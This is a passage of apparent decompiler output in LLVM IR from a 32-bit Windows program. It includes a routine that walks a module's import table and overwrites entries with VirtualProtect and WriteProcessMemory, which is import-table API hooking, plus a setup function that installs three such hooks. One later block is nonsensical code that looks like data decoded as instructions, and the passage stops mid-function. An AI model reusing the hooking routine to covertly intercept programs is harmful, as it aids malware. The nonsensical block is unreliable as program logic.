  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1991
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1991
  %32 = add i32 %esp.0, -16, !insn.addr !1992
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1992
  store i32 %31, i32* %33, align 4, !insn.addr !1992
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1993
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1993
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1994
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1994
  store i32 %35, i32* %37, align 4, !insn.addr !1994
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1995
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1996
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !1996

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !1997
  %40 = add i32 %esp.0, -20, !insn.addr !1998
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1998
  store i32 %39, i32* %41, align 4, !insn.addr !1998
  %42 = load i32, i32* %15, align 4, !insn.addr !1999
  %43 = add i32 %esp.0, -24, !insn.addr !2000
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2000
  store i32 %42, i32* %44, align 4, !insn.addr !2000
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2001
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2001
  br label %dec_label_pc_4076cb, !insn.addr !2001

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !2002

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2003
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2004
  %48 = load i32, i32* %47, align 4, !insn.addr !2004
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2004
  br label %dec_label_pc_4076e2, !insn.addr !2005

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2006
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2006
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1978
  ret i32 %eax.0.reload, !insn.addr !2007
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !2008
  %eax.0.reg2mem = alloca i32, !insn.addr !2008
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2009
  %4 = add i32 %3, 8, !insn.addr !2010
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2010
  %6 = load i32, i32* %5, align 4, !insn.addr !2010
  %7 = icmp eq i32 %6, 0, !insn.addr !2010
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2011
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !2011

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !2012
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2012
  %10 = load i32, i32* %9, align 4, !insn.addr !2012
  %11 = icmp eq i32 %10, 0, !insn.addr !2012
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2013
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !2013

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !2014
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2014
  %14 = load i32, i32* %13, align 4, !insn.addr !2014
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2015
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2016
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2016
  %18 = load i32, i32* %5, align 4, !insn.addr !2017
  %19 = icmp eq i32 %18, %17, !insn.addr !2017
  %20 = icmp eq i1 %19, false, !insn.addr !2018
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2018
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !2018

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !2019
  %22 = call i32 @function_407734(i32 %21), !insn.addr !2020
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2020
  br label %dec_label_pc_407726, !insn.addr !2020

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2021
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2022
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !2022

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2023
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2023
  br label %dec_label_pc_407731, !insn.addr !2023

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2024
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !2025
  %esp.0.reg2mem = alloca i32, !insn.addr !2025
  %storemerge6.reg2mem = alloca i32, !insn.addr !2025
  %.reg2mem14 = alloca i32, !insn.addr !2025
  %esp.17.reg2mem = alloca i32, !insn.addr !2025
  %esi.08.reg2mem = alloca i32, !insn.addr !2025
  %.reg2mem = alloca i32, !insn.addr !2025
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2026
  %4 = icmp eq i1 %3, false, !insn.addr !2027
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2028
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !2027

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !2029
  %7 = trunc i32 %1 to i8, !insn.addr !2030
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2031
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2032
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2032
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2032
  %11 = icmp eq i32* %9, null, !insn.addr !2033
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2034
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !2034

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !2035
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2035
  %14 = load i32, i32* %13, align 4, !insn.addr !2035
  %15 = icmp eq i32 %14, 0, !insn.addr !2036
  %16 = icmp eq i1 %15, false, !insn.addr !2037
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2037
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !2037

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2031
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2038
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2039
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2040
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2040
  store i32 %18, i32* %25, align 4, !insn.addr !2040
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2041
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2041
  store i32 %23, i32* %27, align 4, !insn.addr !2041
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2042
  %29 = icmp eq i32 %28, 0, !insn.addr !2043
  %30 = icmp eq i1 %29, false, !insn.addr !2044
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2044
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2044

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2045
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2045
  %33 = load i32, i32* %32, align 4, !insn.addr !2045
  %34 = add i32 %33, %arg1, !insn.addr !2046
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2047
  %36 = load i32, i32* %35, align 4, !insn.addr !2047
  %37 = icmp eq i32 %36, 0, !insn.addr !2048
  %38 = icmp eq i1 %37, false, !insn.addr !2049
  store i32 %36, i32* %.reg2mem14, !insn.addr !2049
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2049
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2049
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2049

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2050
  %40 = icmp eq i1 %39, false, !insn.addr !2051
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2051

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2052
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2052
  store i32 %20, i32* %42, align 4, !insn.addr !2052
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2053
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2053
  store i32 128, i32* %44, align 4, !insn.addr !2053
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2054
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2054
  store i32 4, i32* %46, align 4, !insn.addr !2054
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2055
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2055
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2055
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2056
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2057
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2057
  store i32 %21, i32* %51, align 4, !insn.addr !2057
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2058
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2058
  store i32 4, i32* %53, align 4, !insn.addr !2058
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2059
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2059
  store i32 %22, i32* %55, align 4, !insn.addr !2059
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2060
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2060
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2060
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2061
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2061
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2062
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2062
  store i32 %59, i32* %61, align 4, !insn.addr !2062
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2063
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2064
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2064
  store i32 %21, i32* %64, align 4, !insn.addr !2064
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2065
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2066
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2066
  store i32 %65, i32* %67, align 4, !insn.addr !2066
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2067
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2067
  store i32 4, i32* %69, align 4, !insn.addr !2067
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2068
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2068
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2068
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2069
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2070
  br label %dec_label_pc_4077d7, !insn.addr !2070

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2071
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2047
  %75 = load i32, i32* %74, align 4, !insn.addr !2047
  %76 = icmp eq i32 %75, 0, !insn.addr !2048
  %77 = icmp eq i1 %76, false, !insn.addr !2049
  store i32 %75, i32* %.reg2mem14, !insn.addr !2049
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2049
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2049
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2049

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2072
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2035
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2035
  %81 = load i32, i32* %80, align 4, !insn.addr !2035
  %82 = icmp eq i32 %81, 0, !insn.addr !2036
  %83 = icmp eq i1 %82, false, !insn.addr !2037
  store i32 %81, i32* %.reg2mem, !insn.addr !2037
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2037
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2037
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2037
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !2037

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2073
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2074
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2074
  %3 = load i32, i32* %2, align 4, !insn.addr !2074
  ret i32 %3, !insn.addr !2075
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2076
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2076
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2076
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2077
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2078
  %3 = add i32 %2, 1, !insn.addr !2078
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2078
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2079
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2080
  ret i32 0, !insn.addr !2081
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2082
  ret i32 %0, !insn.addr !2082
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2083
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2084
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2085
  %2 = add i32 %1, -1, !insn.addr !2085
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2085
  ret i32 %0, !insn.addr !2086
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2087
  ret i32 %3, !insn.addr !2088
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2089
  %2 = icmp eq i1 %1, false, !insn.addr !2090
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2091
  ret i32 %3, !insn.addr !2092
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2093
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2093
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2093
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2094
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2095
  %3 = call i32 @"@LStrPos"(), !insn.addr !2096
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2097
  %6 = call i32 @"@LStrPos"(), !insn.addr !2098
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2099
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2100
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2101
  ret i32 %9, !insn.addr !2102
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2103
  ret i32 %0, !insn.addr !2103
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2104
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2105
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2106
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2107
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2108
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2109
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2110
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2111
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2112
  ret i32 %2, !insn.addr !2113
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2114
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2114
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2114

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2115

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2116
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2116
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2116
  store i8 %12, i8* %13, align 1, !insn.addr !2116
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2117
  store i8 %14, i8* %13, align 1, !insn.addr !2117
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2118
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2118
  %19 = add i8 %16, %18, !insn.addr !2118
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2118
  store i8 %19, i8* %20, align 1, !insn.addr !2118
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2119
  %21 = trunc i32 %arg10 to i16, !insn.addr !2120
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2120
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2120
  store i32 %22, i32* %23, align 4, !insn.addr !2120
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2121
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2122
  %25 = load i8, i8* %24, align 1, !insn.addr !2122
  %26 = trunc i32 %arg1 to i8, !insn.addr !2122
  %27 = add i8 %25, %26, !insn.addr !2122
  store i8 %27, i8* %24, align 1, !insn.addr !2122
  %28 = trunc i32 %arg3 to i16, !insn.addr !2123
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2123
  %30 = load i32, i32* %29, align 4, !insn.addr !2123
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2123
  %31 = add i32 %arg5, 67, !insn.addr !2124
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2124
  %34 = load i32, i32* %33, align 4, !insn.addr !2124
  %35 = load i8, i8* %24, align 1, !insn.addr !2125
  %36 = add i8 %35, %26, !insn.addr !2125
  store i8 %36, i8* %24, align 1, !insn.addr !2125
  %37 = mul i32 %34, 1557718248, !insn.addr !2126
  %38 = add i32 %arg7, 97, !insn.addr !2126
  %39 = add i32 %38, %37, !insn.addr !2126
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2126
  %41 = load i8, i8* %40, align 1, !insn.addr !2126
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2126
  %44 = add i8 %43, %41, !insn.addr !2126
  %45 = icmp eq i8 %44, 0, !insn.addr !2126
  store i8 %44, i8* %40, align 1, !insn.addr !2126
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2127
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2127

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2128

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2129
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2129
  store i8 %48, i8* %49, align 1, !insn.addr !2129
  %50 = add i32 %3, 104, !insn.addr !2130
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2130
  %52 = load i8, i8* %51, align 1, !insn.addr !2130
  %53 = udiv i32 %4, 256, !insn.addr !2130
  %54 = trunc i32 %53 to i8, !insn.addr !2130
  %55 = add i8 %52, %54, !insn.addr !2130
  store i8 %55, i8* %51, align 1, !insn.addr !2130
  %56 = trunc i32 %4 to i16, !insn.addr !2131
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2131
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2131
  store i8 %57, i8* %58, align 1, !insn.addr !2131
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2132
  store i8 %59, i8* %58, align 1, !insn.addr !2132
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2133
  store i8 %60, i8* %58, align 1, !insn.addr !2133
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2134
  store i8 %61, i8* %58, align 1, !insn.addr !2134
  %62 = load i8, i8* %51, align 1, !insn.addr !2135
  %63 = trunc i32 %4 to i8, !insn.addr !2135
  %64 = add i8 %62, %63, !insn.addr !2135
  store i8 %64, i8* %51, align 1, !insn.addr !2135
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2136
  store i8 %65, i8* %58, align 1, !insn.addr !2136
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2137
  store i8 %66, i8* %58, align 1, !insn.addr !2137
  %67 = add i32 %2, 1, !insn.addr !2138
  %68 = icmp slt i32 %67, 0, !insn.addr !2138
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2139

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2140
  %72 = xor i32 %4, %1, !insn.addr !2141
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2142
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2142
  %76 = load i16, i16* %75, align 2, !insn.addr !2142
  %77 = trunc i32 %72 to i16, !insn.addr !2142
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2142
  %78 = load i8, i8* %73, align 4, !insn.addr !2143
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2143
  %81 = add i8 %78, %80, !insn.addr !2143
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2143
  store i8 %81, i8* %82, align 1, !insn.addr !2143
  %83 = add i32 %71, 82, !insn.addr !2144
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2144
  %85 = load i8, i8* %84, align 1, !insn.addr !2144
  %86 = add i8 %85, %63, !insn.addr !2144
  store i8 %86, i8* %84, align 1, !insn.addr !2144
  %87 = load i32, i32* %eax, align 4, !insn.addr !2145
  %88 = add i32 %87, -1, !insn.addr !2145
  %89 = add i32 %71, 4227341, !insn.addr !2146
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2146
